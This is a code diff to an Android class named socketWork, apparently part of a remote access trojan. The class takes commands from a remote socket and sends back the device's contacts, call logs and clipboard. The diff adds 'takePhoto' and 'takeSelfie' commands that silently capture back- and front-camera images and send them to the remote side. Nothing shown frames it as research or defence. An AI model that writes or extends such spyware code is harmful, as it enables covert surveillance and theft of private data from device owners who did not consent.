@@ -2,6 +2,7 @@
 
 import android.app.Activity;
 import android.content.Context;
+import android.hardware.Camera;
 import android.os.AsyncTask;
 import android.util.Log;
 
@@ -48,6 +49,7 @@ public class socketWork extends AsyncTask<Void, Void, Void> {
                         socket.close();
                         break;
                     case "getContacts":
+                        //TODO Handle the getContacts Runtime Permission check on android which crashes the thing
                         out.write(modules.getContactNumbers(context).getBytes("UTF-8"));
                         break;
                     case "getCallLogs":
@@ -64,16 +66,12 @@ public class socketWork extends AsyncTask<Void, Void, Void> {
                         //TODO Patch nullPointerException
                         out.write(modules.getClipBoardContent(activity).getBytes("UTF-8"));
                         break;
-                    case "getImage":
-                        out.write(modules.getPhoto(context, out).getBytes("UTF-8"));
+                    case "takePhoto":
+                        out.write(modules.takePhoto(Camera.CameraInfo.CAMERA_FACING_BACK , context, out).getBytes("UTF-8"));
                         break;
-                    case "getSelfie":
-                        out.write(modules.getSelfie(context, out).getBytes("UTF-8"));
+                    case "takeSelfie":
+                        out.write(modules.takePhoto(Camera.CameraInfo.CAMERA_FACING_FRONT, context, out).getBytes("UTF-8"));
                         break;
-//                    case "toggleFlashLight":
-//                        TODO Patch Module for toggle FLashLight
-//                        out.write(modules.toggleFlashLight(context).getBytes("UTF-8"));
-//                        break;
                     default:
                         String badStuff = "Unable to understand you!";
                         out.write(badStuff.getBytes("UTF-8"));
